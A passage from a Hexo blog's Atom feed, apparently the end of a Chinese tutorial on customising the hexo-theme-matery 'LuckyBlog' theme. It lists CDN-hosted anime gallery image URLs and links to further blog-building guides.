https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/12.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/09.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/14.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/15.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/16.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/06.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/02.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/03.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/04.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/07.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/08.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/11.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/10.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/09.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/12.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/13.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/14.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/16.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/15.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/11.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/09.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/03.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/08.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/03.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/13.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/01.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/05.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/14.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/01.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-更多内容优化"><a href="#0x04-更多内容优化" class="headerlink" title="0x04 更多内容优化"></a>0x04 更多内容优化</h3><p>以上简单介绍了 <code>LuckyBlog</code> 中一些要修改的个性化地方，其他更详细的优化参考其他关于<code>Matery</code>的文章。以下几篇文章都是基于<code>hexo-theme-matery</code>主题优化的教程，大家如果遇到问题，可以参考其中的方法。</p><ul><li><a href="http://luckyzmj.cn/posts/e3e08109.html">个人博客搭建</a></li><li><a href="https://sunhwee.com/posts/6e8839eb.html">Hexo+Github博客搭建完全教程</a></li><li><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">hexo-theme-matery作者教程</a></li><li><a href="https://yafine-blog.cn/posts/4ab2.html">Hexo+github搭建博客(超级详细版，精细入微)</a></li><li><a href="https://blog.csdn.net/cungudafa/article/details/106278206">hexo（matery）背景、滚动条优化+增加点击跳评论</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="博客篇" scheme="https://github.com/chenchanghui/chenchanghui.github.io/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"/>
    
    
    <category term="hexo-blog-lucky" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/hexo-blog-lucky/"/>
    
    <category term="博客搭建教程" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
</feed>
